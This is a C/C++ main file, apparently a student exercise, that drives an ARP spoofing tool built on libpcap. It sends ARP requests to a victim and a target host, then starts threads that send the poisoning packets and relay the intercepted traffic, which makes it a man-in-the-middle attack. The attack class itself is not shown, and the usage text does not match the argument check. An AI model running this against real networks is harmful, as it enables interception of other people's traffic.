#include "include.h"

void usage()
{
    printf("syntax: pcap_test <interface> <victim_ip>\n");
    printf("sample: pcap_test wlan0 192.168.0.2\n");
}


int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    uint8_t victim_ip[4];
    uint8_t target_ip[4];

    inet_pton(AF_INET, argv[2], victim_ip);
    inet_pton(AF_INET, argv[3], target_ip);
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    pthread_t p_thread[2];


    arp * my_arp = new arp(handle, dev, victim_ip, target_ip);


    my_arp->set_req(0);
    my_arp->send_req(0);

    my_arp->set_req(1);
    my_arp->send_req(1);

    my_arp->set_att();

    if (pthread_create(&p_thread[0], NULL, &arp::send_att_thread, my_arp) != 0)
    {
        printf("send_att_thread error\n");
    }

    if (pthread_create(&p_thread[0], NULL, &arp::relay_thread, my_arp) != 0)
    {
        printf("send_att_thread error\n");
    }


    sleep(100);

    pcap_close(handle);

    

    return 0;
}
